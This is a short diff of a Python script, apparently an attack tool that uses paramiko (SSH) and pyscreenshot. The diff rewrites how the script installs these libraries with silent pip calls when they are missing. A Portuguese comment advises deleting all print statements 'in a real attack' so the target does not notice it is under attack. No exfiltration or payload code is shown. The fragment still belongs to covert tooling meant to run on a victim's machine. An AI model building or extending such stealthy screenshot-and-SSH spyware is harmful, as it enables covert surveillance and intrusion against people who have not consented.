@@ -7,24 +7,13 @@ import subprocess
 try:
 	import paramiko
 except ImportError:
-	try:
-		os.system("pip install paramiko")
-	except:
-		os.system("pip3 install paramiko")
-finally:
-	import paramiko
-
-#try:
-try:
-	os.system("pip install pyscreenshot --user")
-except:
-	os.system("pip install pyscreenshot")
+	os.system("pip3 install paramiko")
+import paramiko
 
 try:
-        os.system("pip install pillow")
+	import pyscreenshot as pst
 except:
-        os.system("pip install pillow --user")
-
+	os.system("pip3 install pyscreenshot pillow")
 import pyscreenshot as pst
 
 ## TODAS AS INSTRUÇÕES "PRINT" são aconselhaveis apaga-las em um ataque real, uma vez que a target machine não tem a necessidade, e pode ate ser perigoso para o ataque, uma vez que o target saberia que esta sendo atacado
